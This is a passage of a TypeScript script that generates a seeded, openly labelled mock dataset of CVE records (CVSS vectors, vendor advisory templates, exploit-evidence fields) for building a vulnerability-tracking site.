/**
 * Deterministic mock dataset for developing the site without the real pipeline.
 *
 *   npx tsx scripts/mock-data.ts [outDir]        (default: site/public/data)
 *
 * Writes exactly the tree the pipeline emits (<out>/v1/*.json, <out>/v1/cve/<xx>.json for all 256
 * shards, <out>/feeds/*) and conforms to shared/contract.ts. The shape follows the October 2026
 * flood: ~16k CVEs in a 30-day window ending 2026-10-26, Microsoft's 1,407-CVE Patch Tuesday on
 * Oct 13, Oracle CPU + Chrome on Oct 20, Linux kernel dumps, the WordPress CNAs and the VulnCheck
 * long tail. Evidence is synthesised per record and scored with the shared model, so every chip,
 * point and tier is self-consistent. A seeded PRNG makes every run byte-identical.
 */
import { mkdirSync, readFileSync, renameSync, rmSync, writeFileSync } from 'node:fs';
import { dirname, join, resolve } from 'node:path';
import { gzipSync } from 'node:zlib';
import {
  KNOB_DEFAULT,
  ROW_COLS,
  SCHEMA_VERSION,
  SIGNAL_MIN_SCORE,
  TIERS,
  tierFor,
  type Batch,
  type Change,
  type CveDetail,
  type Cvss,
  type EpssInfo,
  type ExploitEvidence,
  type KevEntry,
  type KevInfo,
  type Meta,
  type Reason,
  type Row,
  type SourceId,
  type SourceStatus,
  type Ssvc,
  type StatsFile,
  type Tier,
} from '../shared/contract';
import {
  BASE_POINTS,
  BATCH_MIN,
  CHIP_BY_ID,
  COLD_START_DAYS,
  EXPLOITED_BONUS,
  EXPLOITED_FLOOR,
  RANSOMWARE_BONUS,
  SCORE_MODEL,
} from '../shared/model';
import { SHARD_COUNT, shardOf } from '../shared/shard';
import { BRAND, REPO_URL } from '../shared/brand';

// ───────────────────────────── clock & randomness ─────────────────────────────

const NOW = Date.UTC(2026, 9, 26, 19, 30);
const HOUR = 3_600_000;
const DAY = 24 * HOUR;
const WINDOW_DAYS = 30;
const WINDOW_START = NOW - WINDOW_DAYS * DAY;
const GENERATED_AT = new Date(NOW).toISOString();
/** Published-in-October target (matches the real month-to-date count). */
const OCTOBER_TOTAL = 14_070;
/** Published Sep 26 19:30 – Sep 30 (the window's first four days). */
const SEPTEMBER_TAIL_TOTAL = 1_890;
const EXPLOITED_SHARE = 0.004;
const ARTIFACT_SHARE = 0.023;
/** Records forced into the exploited set: [cna, count] taken from that CNA's patch-day batch. */
const ZERO_DAYS: readonly (readonly [string, number])[] = [['microsoft', 2], ['Chrome', 1], ['oracle', 1]];

/** mulberry32: tiny, fast, good enough for synthetic data. */
function mulberry32(seed: number): () => number {
  let a = seed >>> 0;
  return () => {
    a = (a + 0x6d2b79f5) >>> 0;
    let t = a;
    t = Math.imul(t ^ (t >>> 15), t | 1);
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}

const rand = mulberry32(0x5eed_2026);
const chance = (p: number) => rand() < p;
const int = (lo: number, hi: number) => lo + Math.floor(rand() * (hi - lo + 1));
const pick = <T>(xs: readonly T[]): T => xs[Math.floor(rand() * xs.length)];
function weighted<T>(pairs: readonly (readonly [T, number])[]): T {
  const total = pairs.reduce((a, [, w]) => a + w, 0);
  let x = rand() * total;
  for (const [v, w] of pairs) if ((x -= w) < 0) return v;
  return pairs[pairs.length - 1][0];
}
const hex = (n: number) => Array.from({ length: n }, () => '0123456789abcdef'[int(0, 15)]).join('');
const uuid = () => `${hex(8)}-${hex(4)}-4${hex(3)}-${pick(['8', '9', 'a', 'b'])}${hex(3)}-${hex(12)}`;
const ghsa = () => {
  const a = '23456789cfghjmpqrvwx';
  const seg = () => Array.from({ length: 4 }, () => a[int(0, a.length - 1)]).join('');
  return `GHSA-${seg()}-${seg()}-${seg()}`;
};
const slugify = (s: string) => s.toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/^-|-$/g, '');
const iso = (t: number) => new Date(t).toISOString().replace(/\.\d{3}Z$/, 'Z');
const ymd = (t: number) => new Date(t).toISOString().slice(0, 10);
const MONTHS = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
/** "Oct 21" in the current year, "Oct 6, 2025" otherwise (matches pipeline chip labels). */
function shortDate(t: number): string {
  const d = new Date(t);
  const base = `${MONTHS[d.getUTCMonth()]} ${d.getUTCDate()}`;
  return d.getUTCFullYear() === new Date(NOW).getUTCFullYear() ? base : `${base}, ${d.getUTCFullYear()}`;
}
const fmtInt = (n: number) => n.toLocaleString('en-US');
const pct = (x: number) => `${(x * 100).toFixed(x >= 0.1 ? 1 : 2)}%`;
const ordinal = (n: number) => `${n}${n % 100 >= 11 && n % 100 <= 13 ? 'th' : (['th', 'st', 'nd', 'rd'][n % 10] ?? 'th')}`;

// ───────────────────────────── vocabulary ─────────────────────────────

type Band = 'crit' | 'high' | 'med' | 'low';
type Prior = { kind: 'product' | 'vendor' | 'none'; count: number };
const P = (count: number): Prior => ({ kind: 'product', count });
const V = (count: number): Prior => ({ kind: 'vendor', count });
const NONE: Prior = { kind: 'none', count: 0 };

interface Kind {
  label: string;
  cwe: string;
  bands: readonly (readonly [Band, number])[];
  local?: boolean;
  /** Effect phrase for generated descriptions. */
  effect: string;
}

const KINDS = {
  rce: { label: 'Remote Code Execution', cwe: 'CWE-94', bands: [['crit', 5], ['high', 5]], effect: 'execute arbitrary code' },
  eop: { label: 'Elevation of Privilege', cwe: 'CWE-269', bands: [['high', 9], ['crit', 1]], local: true, effect: 'elevate privileges' },
  info: { label: 'Information Disclosure', cwe: 'CWE-200', bands: [['med', 8], ['high', 2]], effect: 'read sensitive information' },
  dos: { label: 'Denial of Service', cwe: 'CWE-400', bands: [['med', 5], ['high', 5]], effect: 'cause a denial of service' },
  sfb: { label: 'Security Feature Bypass', cwe: 'CWE-693', bands: [['med', 6], ['high', 4]], effect: 'bypass a security feature' },
  spoof: { label: 'Spoofing', cwe: 'CWE-451', bands: [['med', 9], ['low', 1]], effect: 'spoof trusted content' },
  sqli: { label: 'SQL Injection', cwe: 'CWE-89', bands: [['crit', 3], ['high', 4], ['med', 3]], effect: 'read or modify the database' },
  xss: { label: 'Cross-Site Scripting', cwe: 'CWE-79', bands: [['med', 9], ['low', 1]], effect: 'inject arbitrary web script' },
  csrf: { label: 'Cross-Site Request Forgery', cwe: 'CWE-352', bands: [['med', 8], ['high', 2]], effect: 'perform actions on behalf of a logged-in user' },
  path: { label: 'Path Traversal', cwe: 'CWE-22', bands: [['high', 5], ['med', 4], ['crit', 1]], effect: 'read arbitrary files' },
  ssrf: { label: 'Server-Side Request Forgery', cwe: 'CWE-918', bands: [['med', 5], ['high', 5]], effect: 'reach internal services' },
  authz: { label: 'Missing Authorization', cwe: 'CWE-862', bands: [['med', 8], ['high', 2]], effect: 'access functionality they should not reach' },
  auth: { label: 'Authentication Bypass', cwe: 'CWE-288', bands: [['crit', 6], ['high', 4]], effect: 'bypass authentication' },
  cmdi: { label: 'OS Command Injection', cwe: 'CWE-78', bands: [['crit', 5], ['high', 5]], effect: 'run operating system commands' },
  deser: { label: 'Deserialization of Untrusted Data', cwe: 'CWE-502', bands: [['crit', 5], ['high', 5]], effect: 'execute arbitrary code' },
  uaf: { label: 'Use After Free', cwe: 'CWE-416', bands: [['high', 9], ['crit', 1]], effect: 'corrupt memory and potentially execute code' },
  overflow: { label: 'Heap-based Buffer Overflow', cwe: 'CWE-122', bands: [['high', 7], ['crit', 2], ['med', 1]], effect: 'corrupt memory' },
  upload: { label: 'Unrestricted File Upload', cwe: 'CWE-434', bands: [['crit', 6], ['high', 4]], effect: 'upload and run a web shell' },
  oob: { label: 'Out-of-bounds Read', cwe: 'CWE-125', bands: [['med', 6], ['high', 4]], effect: 'read memory out of bounds' },
  redirect: { label: 'Open Redirect', cwe: 'CWE-601', bands: [['med', 10]], effect: 'redirect users to an attacker-controlled site' },
  creds: { label: 'Hard-coded Credentials', cwe: 'CWE-798', bands: [['crit', 6], ['high', 4]], effect: 'log in with a built-in account' },
  xxe: { label: 'XML External Entity Injection', cwe: 'CWE-611', bands: [['high', 7], ['med', 3]], effect: 'read local files' },
  race: { label: 'Race Condition', cwe: 'CWE-362', bands: [['med', 6], ['high', 4]], effect: 'corrupt shared state' },
} as const satisfies Record<string, Kind>;
type KindKey = keyof typeof KINDS;

const V3: Record<Band, readonly (readonly [number, string])[]> = {
  crit: [
    [9.8, 'AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H'],
    [9.1, 'AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N'],
    [10.0, 'AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H'],
    [9.6, 'AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H'],
    [9.0, 'AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H'],
    [9.3, 'AV:L/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H'],
  ],
  high: [
    [8.8, 'AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H'],
    [8.8, 'AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H'],
    [8.1, 'AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H'],
    [7.8, 'AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H'],
    [7.8, 'AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H'],
    [7.5, 'AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N'],
    [7.5, 'AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H'],
    [7.2, 'AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H'],
    [7.0, 'AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H'],
    [7.1, 'AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N'],
  ],
  med: [
    [6.5, 'AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N'],
    [6.4, 'AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:N'],
    [6.1, 'AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N'],
    [5.5, 'AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H'],
    [5.4, 'AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N'],
    [5.3, 'AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N'],
    [4.9, 'AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:N/A:H'],
    [4.3, 'AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N'],
    [6.3, 'AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L'],
    [4.4, 'AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L'],
  ],
  low: [
    [3.7, 'AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N'],
    [3.1, 'AV:N/AC:H/PR:L/UI:R/S:U/C:L/I:N/A:N'],
    [2.4, 'AV:P/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N'],
  ],
};
const V4: Record<Band, readonly (readonly [number, string])[]> = {
  crit: [
    [9.3, 'AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N'],
    [9.2, 'AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N'],
    [10.0, 'AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H'],
    [9.4, 'AV:L/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H'],
  ],
  high: [
    [8.7, 'AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N'],
    [8.6, 'AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N'],
    [7.7, 'AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N'],
    [8.5, 'AV:L/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N'],
    [7.3, 'AV:L/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N'],
  ],
  med: [
    [6.9, 'AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:L/VA:L/SC:N/SI:N/SA:N'],
    [5.3, 'AV:N/AC:L/AT:N/PR:L/UI:N/VC:L/VI:L/VA:L/SC:N/SI:N/SA:N'],
    [5.1, 'AV:N/AC:L/AT:N/PR:L/UI:P/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N'],
    [4.8, 'AV:N/AC:L/AT:N/PR:H/UI:N/VC:L/VI:L/VA:L/SC:N/SI:N/SA:N'],
    [6.8, 'AV:L/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N'],
  ],
  low: [
    [2.1, 'AV:L/AC:L/AT:N/PR:L/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N'],
    [2.3, 'AV:N/AC:H/AT:P/PR:L/UI:P/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N'],
  ],
};
const SEVERITY: Record<Band, string> = { crit: 'CRITICAL', high: 'HIGH', med: 'MEDIUM', low: 'LOW' };

function makeCvss(kind: Kind, version: '3.1' | '4.0', source: Cvss['source'], suffix = '', band?: Band): Cvss {
  const b = band ?? weighted(kind.bands);
  const table = (version === '4.0' ? V4 : V3)[b];
  const wantLocal = !!kind.local;
  const fitting = table.filter(([, v]) => v.startsWith('AV:L') === wantLocal || v.startsWith('AV:P'));
  const [score, vector] = pick(fitting.length > 0 ? fitting : table);
  return { version, score, severity: SEVERITY[b], vector: `CVSS:${version}/${vector}${suffix}`, source };
}

/** First-person-free, fictional PoC authors (never real people). */
const POC_AUTHORS = ['nullpage-labs', 'kestrel-sec', 'octo-poc', 'r3dhook', 'mira-sec', 'blueteam-lab', 'syn-ack-1337', 'p0c-forge', 'deadbeef-research', 'lattice-sec', 'quietwire', 'emberscan'];
const AI_CREDITS: readonly (readonly [string, number])[] = [
  ['Claude Security', 40],
  ['Claude Opus 5.5 (1M context)', 22],
  ["Discovered by Claude, Anthropic's AI assistant", 18],
  ['Claude', 12],
  ['Big Sleep (Google DeepMind)', 14],
  ['XBOW autonomous pentester', 12],
  ['Aardvark (OpenAI)', 10],
  ['ZeroPath AI security scanner', 9],
  ['depthfirst', 8],
  ['zerotrail-ai', 7],
  ['striga.ai', 6],
  ['Gemini 3 Pro (AI-assisted)', 5],
];

// ───────────────────────────── record synthesis ─────────────────────────────

type Noise = 'hobby' | 'wordpress' | 'kernel' | null;

interface Synth {
  vendor: string;
  product: string;
  purl: string | null;
  title: string | null;
  description: string;
  cwe: string[];
  cvss: Cvss | null;
  /** CNA CVSS vectors include an exploit-maturity metric we may rewrite (non-VulDB only). */
  cnaVector: boolean;
  references: string[];
  prior: Prior;
  noise: Noise;
  tags: string[];
}

interface Profile {
  cna: string;
  /** Records in the window, batches included. */
  total: number;
  batches?: readonly (readonly [date: string, count: number, hourUtc: number])[];
  tz: 'us' | 'eu' | 'asia';
  /** P(CISA-ADP SSVC assessment) once the record is a day old. */
  ssvc: number;
  /** Relative weight when choosing confirmed-exploited records. */
  exploitWeight: number;
  /** Relative weight when choosing records that get public exploit artifacts. */
  artifactWeight: number;
  /** Relative weight for AI-credited discoveries. */
  aiWeight: number;
  make(id: string, pub: number): Synth;
}

interface ProductDef {
  vendor: string;
  product: string;
  prior: Prior;
  purl?: string;
}
const prod = (vendor: string, product: string, prior: Prior = NONE, purl?: string): ProductDef => ({ vendor, product, prior, purl });

// ── Microsoft ──
const MS_COMPONENTS: readonly (readonly [component: string, product: string, kinds: readonly KindKey[], prior: Prior])[] = [
  ['Windows Kernel', 'Windows 11 Version 25H2', ['eop', 'info'], P(48)],
  ['Windows Common Log File System Driver', 'Windows 11 Version 25H2', ['eop'], P(48)],
  ['Windows Win32k', 'Windows 11 Version 25H2', ['eop'], P(48)],
  ['Windows SMB Client', 'Windows Server 2025', ['eop', 'rce'], P(31)],
  ['Windows TCP/IP', 'Windows Server 2025', ['rce', 'dos', 'info'], P(31)],
  ['Windows Remote Desktop Services', 'Windows Server 2025', ['rce', 'dos'], P(31)],
  ['Windows NTLM', 'Windows 11 Version 25H2', ['spoof', 'eop'], P(48)],
  ['Windows Graphics Component', 'Windows 10 Version 22H2', ['rce', 'eop', 'info'], P(62)],
  ['Windows Hyper-V', 'Windows Server 2025', ['eop', 'dos', 'rce'], P(31)],
  ['Windows Routing and Remote Access Service (RRAS)', 'Windows Server 2022', ['rce', 'info'], P(27)],
  ['Windows Ancillary Function Driver for WinSock', 'Windows 11 Version 24H2', ['eop'], P(48)],
  ['Windows Cloud Files Mini Filter Driver', 'Windows 11 Version 24H2', ['eop'], P(48)],
  ['Windows MSHTML Platform', 'Windows 10 Version 22H2', ['sfb', 'spoof', 'rce'], P(62)],
  ['Windows Kerberos', 'Windows Server 2025', ['eop', 'sfb', 'dos'], P(31)],
  ['Windows Local Security Authority (LSA)', 'Windows Server 2022', ['eop', 'dos'], P(27)],
  ['Windows BitLocker', 'Windows 11 Version 25H2', ['sfb'], P(48)],
  ['Windows Media', 'Windows 11 Version 24H2', ['rce', 'info'], P(48)],
  ['Windows Bluetooth Service', 'Windows 11 Version 25H2', ['eop'], P(48)],
  ['Windows Telephony Service', 'Windows Server 2019', ['rce', 'eop'], P(22)],
  ['Windows DWM Core Library', 'Windows 11 Version 24H2', ['eop'], P(48)],
  ['Windows Storage Management Provider', 'Windows Server 2025', ['info'], P(31)],
  ['Windows Connected Devices Platform Service', 'Windows 11 Version 25H2', ['eop', 'dos'], P(48)],
  ['Microsoft Excel', 'Microsoft Office LTSC 2024', ['rce', 'info'], P(9)],
  ['Microsoft Word', 'Microsoft Office LTSC 2024', ['rce', 'info'], P(9)],
  ['Microsoft PowerPoint', 'Microsoft 365 Apps for Enterprise', ['rce'], P(6)],
  ['Microsoft Office', 'Microsoft 365 Apps for Enterprise', ['rce', 'eop', 'spoof'], P(6)],
  ['Microsoft SharePoint', 'Microsoft SharePoint Server Subscription Edition', ['rce', 'spoof', 'sfb'], P(8)],
  ['Microsoft Exchange Server', 'Microsoft Exchange Server 2019 Cumulative Update 15', ['spoof', 'rce', 'eop'], P(11)],
  ['Azure Monitor Agent', 'Azure Monitor Agent', ['eop', 'rce'], V(212)],
  ['Azure Connected Machine Agent', 'Azure Connected Machine Agent', ['eop'], V(212)],
  ['Visual Studio Code', 'Visual Studio Code', ['rce', 'eop'], V(212)],
  ['.NET', '.NET 10.0', ['dos', 'sfb', 'rce'], P(4)],
  ['Microsoft SQL Server', 'Microsoft SQL Server 2022', ['eop', 'rce'], V(212)],
  ['Microsoft Dynamics 365 (on-premises)', 'Microsoft Dynamics 365 (on-premises) version 9.1', ['spoof', 'info'], V(212)],
  ['Azure Linux', 'Azure Linux 3.0', ['dos', 'info', 'eop', 'rce'], V(212)],
  ['Microsoft Edge (Chromium-based)', 'Microsoft Edge (Chromium-based)', ['spoof', 'sfb', 'rce'], P(5)],
];
const MS_CAUSE: Record<string, readonly (readonly [string, string])[]> = {
  eop: [['Use after free', 'CWE-416'], ['Heap-based buffer overflow', 'CWE-122'], ['Improper access control', 'CWE-284'], ['Untrusted pointer dereference', 'CWE-822'], ['Type confusion', 'CWE-843']],
  rce: [['Use after free', 'CWE-416'], ['Heap-based buffer overflow', 'CWE-122'], ['Deserialization of untrusted data', 'CWE-502'], ['Improper input validation', 'CWE-20']],
  info: [['Exposure of sensitive information to an unauthorized actor', 'CWE-200'], ['Out-of-bounds read', 'CWE-125'], ['Use of uninitialized resource', 'CWE-908']],
  dos: [['Uncontrolled resource consumption', 'CWE-400'], ['Null pointer dereference', 'CWE-476']],
  sfb: [['Protection mechanism failure', 'CWE-693'], ['Improper verification of cryptographic signature', 'CWE-347']],
  spoof: [['Improper authentication', 'CWE-287'], ['User interface (UI) misrepresentation of critical information', 'CWE-451']],
};

const microsoft: Profile = {
  cna: 'microsoft',
  total: 1_455,
  batches: [['2026-10-13', 1_407, 17]],
  tz: 'us',
  ssvc: 0.99,
  exploitWeight: 0.1,
  artifactWeight: 0.25,
  aiWeight: 0.2,
  make(id) {
    const [component, product, kinds, prior] = pick(MS_COMPONENTS);
    const k = pick(kinds);
    const kind = KINDS[k];
    const [cause, cwe] = pick(MS_CAUSE[k] ?? MS_CAUSE.rce);
    // Patch Tuesday is mostly Important: few Criticals, almost all of them RCE.
    const band: Band = k === 'rce' ? weighted<Band>([['crit', 0.16], ['high', 0.84]]) : k === 'eop' ? 'high' : weighted<Band>([['high', 0.35], ['med', 0.65]]);
    const cvss = makeCvss(kind, '3.1', 'cna', '/E:U/RL:O/RC:C', band);
    const remote = !cvss.vector.includes('AV:L');
    const actor = cvss.vector.includes('PR:N') ? 'an unauthorized attacker' : 'an authorized attacker';
    return {
      vendor: 'Microsoft',
      product,
      purl: null,
      title: `${component} ${kind.label} Vulnerability`,
      description: `${cause} in ${component} allows ${actor} to ${kind.effect.replace('execute arbitrary code', 'execute code')} ${remote ? 'over a network' : 'locally'}.`,
      cwe: [cwe],
      cvss,
      cnaVector: true,
      references: [`https://msrc.microsoft.com/update-guide/vulnerability/${id}`],
      prior,
      noise: null,
      tags: [],
    };
  },
};

// ── Oracle ──
const ORACLE: readonly (readonly [product: string, family: string, components: readonly string[], prior: Prior])[] = [
  ['MySQL Server', 'Oracle MySQL', ['Server: Optimizer', 'InnoDB', 'Server: DML', 'Server: Replication', 'Server: Security: Privileges', 'Server: DDL', 'Server: Thread Pooling'], V(41)],
  ['Oracle WebLogic Server', 'Oracle Fusion Middleware', ['Core', 'Web Container', 'T3/IIOP'], P(12)],
  ['Oracle E-Business Suite', 'Oracle E-Business Suite', ['Oracle Concurrent Processing', 'Oracle Payables', 'Oracle iProcurement', 'Oracle Configurator'], P(4)],
  ['Oracle Java SE', 'Oracle Java SE', ['Hotspot', 'Libraries', 'JSSE', '2D', 'Networking', 'Security'], P(7)],
  ['Oracle Database Server', 'Oracle Database Server', ['Java VM', 'Core RDBMS', 'Oracle Text', 'Unified Audit'], V(41)],
  ['PeopleSoft Enterprise PeopleTools', 'Oracle PeopleSoft', ['PIA Core Technology', 'Portal', 'Integration Broker'], V(41)],
  ['Oracle Communications Cloud Native Core Policy', 'Oracle Communications', ['Configuration', 'Signaling'], V(41)],
  ['Oracle Hospitality OPERA 5', 'Oracle Hospitality Applications', ['Opera Servlet', 'Integrations'], V(41)],
  ['Oracle Financial Services Analytical Applications Infrastructure', 'Oracle Financial Services Applications', ['Platform'], V(41)],
  ['Oracle VM VirtualBox', 'Oracle Virtualization', ['Core'], V(41)],
  ['Oracle Solaris', 'Oracle Systems', ['Kernel', 'Filesystem'], P(2)],
  ['JD Edwards EnterpriseOne Tools', 'Oracle JD Edwards', ['Web Runtime SEC', 'E1 Dev Platform Tech'], V(41)],
  ['Oracle Retail Xstore Office', 'Oracle Retail Applications', ['Security'], V(41)],
  ['Oracle Siebel CRM', 'Oracle Siebel CRM', ['Siebel Core - Server Framework'], V(41)],
  ['Oracle Agile PLM', 'Oracle Supply Chain', ['Export'], P(1)],
  ['Oracle Identity Manager', 'Oracle Fusion Middleware', ['REST WebServices'], P(1)],
];
const ORACLE_IMPACT: Record<Band, string> = {
  crit: 'takeover of the product',
  high: 'unauthorized creation, deletion or modification access to critical data',
  med: 'unauthorized ability to cause a hang or frequently repeatable crash (complete DOS)',
  low: 'unauthorized read access to a subset of accessible data',
};
const oracle: Profile = {
  cna: 'oracle',
  total: 1_078,
  batches: [['2026-10-20', 1_076, 20]],
  tz: 'us',
  ssvc: 0.42,
  exploitWeight: 0.3,
  artifactWeight: 0.3,
  aiWeight: 0,
  make() {
    const [product, family, components, prior] = pick(ORACLE);
    const band = weighted<Band>([['crit', 0.06], ['high', 0.22], ['med', 0.62], ['low', 0.1]]);
    const kind = KINDS[pick<KindKey>(['rce', 'info', 'dos', 'auth', 'sfb'])];
    const cvss = makeCvss({ ...kind, local: false }, '3.1', 'cna', '', band);
    const access = cvss.vector.includes('PR:N') ? 'unauthenticated attacker' : cvss.vector.includes('PR:L') ? 'low privileged attacker' : 'high privileged attacker';
    return {
      vendor: 'Oracle Corporation',
      product,
      purl: null,
      title: null,
      description:
        `Vulnerability in the ${product} product of ${family} (component: ${pick(components)}). ` +
        `Supported versions that are affected are ${int(8, 14)}.${int(0, 4)}.0-${int(8, 14)}.${int(4, 9)}.${int(0, 9)}. ` +
        `${cvss.vector.includes('AC:L') ? 'Easily' : 'Difficult to'} exploitable vulnerability allows ${access} with network access via ${pick(['HTTP', 'multiple protocols', 'T3, IIOP'])} to compromise ${product}. ` +
        `Successful attacks of this vulnerability can result in ${ORACLE_IMPACT[band]}. CVSS 3.1 Base Score ${cvss.score.toFixed(1)}.`,
      cwe: [],
      cvss,
      cnaVector: true,
      references: ['https://www.oracle.com/security-alerts/cpuoct2026.html'],
      prior,
      noise: null,
      tags: [],
    };
  },
};

// ── Chrome ──
const CHROME_COMPONENTS = ['V8', 'Blink', 'ANGLE', 'Skia', 'WebGPU', 'Dawn', 'Media', 'PDFium', 'Extensions', 'Autofill', 'Navigation', 'Omnibox', 'Downloads', 'DevTools', 'WebRTC', 'Mojo', 'GPU', 'Compositing', 'Fullscreen UI', 'Storage', 'Payments', 'Views', 'WebAudio', 'WebXR', 'Accessibility', 'Loader', 'Network', 'Service Worker', 'ReadingMode', 'Bookmarks', 'Tab Strip', 'Password Manager'];
const CHROME_BUGS: readonly (readonly [string, string, 'mem' | 'policy'])[] = [
  ['Use after free', 'CWE-416', 'mem'],
  ['Heap buffer overflow', 'CWE-122', 'mem'],
  ['Type Confusion', 'CWE-843', 'mem'],
  ['Out of bounds read', 'CWE-125', 'mem'],
  ['Out of bounds write', 'CWE-787', 'mem'],
  ['Integer overflow', 'CWE-190', 'mem'],
  ['Inappropriate implementation', 'CWE-20', 'policy'],
  ['Insufficient policy enforcement', 'CWE-693', 'policy'],
  ['Insufficient validation of untrusted input', 'CWE-20', 'policy'],
  ['Incorrect security UI', 'CWE-451', 'policy'],
  ['Race', 'CWE-362', 'mem'],
  ['Side-channel information leakage', 'CWE-203', 'policy'],
];
const chromeVersion = (pub: number) => (pub < Date.UTC(2026, 9, 3) ? '141.0.7390.65' : pub < Date.UTC(2026, 9, 15) ? '141.0.7390.122' : '142.0.7444.59');
const chrome: Profile = {
  cna: 'Chrome',
  total: 702,
  batches: [['2026-09-30', 142, 21], ['2026-10-07', 96, 20], ['2026-10-20', 353, 22]],
  tz: 'us',
  ssvc: 0.88,
  exploitWeight: 1.4,
  artifactWeight: 0.5,
  aiWeight: 1.2,
  make(_id, pub) {
    const [bug, cwe, kind] = pick(CHROME_BUGS);
    const sev = weighted<'Critical' | 'High' | 'Medium' | 'Low'>([['Critical', 0.04], ['High', 0.46], ['Medium', 0.36], ['Low', 0.14]]);
    const effect = kind === 'mem' ? pick(['potentially exploit heap corruption', 'execute arbitrary code inside the sandbox', 'perform an out of bounds memory read']) : pick(['bypass site isolation', 'spoof the contents of the Omnibox (URL bar)', 'leak cross-origin data', 'perform UI spoofing', 'bypass navigation restrictions']);
    const band: Band = sev === 'Critical' ? 'crit' : sev === 'High' ? 'high' : sev === 'Medium' ? 'med' : 'low';
    const adp = chance(0.85) ? makeCvss({ ...KINDS.rce, local: false }, '3.1', 'cisa-adp', '', band) : null;
    return {
      vendor: 'Google',
      product: 'Chrome',
      purl: null,
      title: null,
      description: `${bug} in ${pick(CHROME_COMPONENTS)} in Google Chrome prior to ${chromeVersion(pub)} allowed a remote attacker to ${effect} via a crafted HTML page. (Chromium security severity: ${sev})`,
      cwe: [cwe],
      cvss: adp,
      cnaVector: false,
      references: [`https://chromereleases.googleblog.com/2026/${String(new Date(pub).getUTCMonth() + 1).padStart(2, '0')}/stable-channel-update-for-desktop.html`, `https://issues.chromium.org/issues/4${int(10_000_000, 99_999_999)}`],
      prior: P(34),
      noise: null,
      tags: [],
    };
  },
};

// ── Linux kernel ──
const KERNEL_SUBSYS = ['net/sched: sch_qfq', 'drm/amdgpu', 'drm/i915', 'drm/xe', 'Bluetooth: hci_sync', 'wifi: mt76: mt7925', 'wifi: ath12k', 'wifi: iwlwifi: mvm', 'ext4', 'btrfs', 'f2fs', 'xfs', 'smb: client', 'ksmbd', 'nfsd', 'io_uring', 'bpf', 'netfilter: nf_tables', 'tcp', 'ipv6', 'mm/hugetlb', 'mm: shmem', 'sched/fair', 'usb: gadget: f_fs', 'usb: typec: ucsi', 'HID: multitouch', 'ALSA: usb-audio', 'ASoC: SOF: Intel', 'scsi: ufs: core', 'nvme-tcp', 'block', 'crypto: qat', 'x86/sev', 'KVM: arm64', 'KVM: x86', 'iommu/vt-d', 'net: stmmac', 'ice', 'mlx5e', 'bnxt_en', 'can: j1939', 'vsock', 'tipc', 'sctp', 'media: uvcvideo', 'dm-integrity', 'md/raid5', 'tee: shm', 'serial: 8250', 'tty: n_gsm', 'fs/ntfs3', 'jfs', 'ocfs2', 'nilfs2', 'erofs', 'ceph'];
const KERNEL_FIX: readonly (readonly [string, string])[] = [
  ['fix use-after-free in', 'CWE-416'],
  ['fix NULL pointer dereference in', 'CWE-476'],
  ['fix out-of-bounds access in', 'CWE-787'],
  ['fix memory leak in', 'CWE-401'],
  ['fix race between teardown and', 'CWE-362'],
  ['avoid infinite loop in', 'CWE-835'],
  ['add missing bounds check in', 'CWE-129'],
  ['fix refcount leak in', 'CWE-911'],
  ['prevent integer overflow in', 'CWE-190'],
  ['fix deadlock in', 'CWE-833'],
  ['validate attribute length in', 'CWE-1284'],
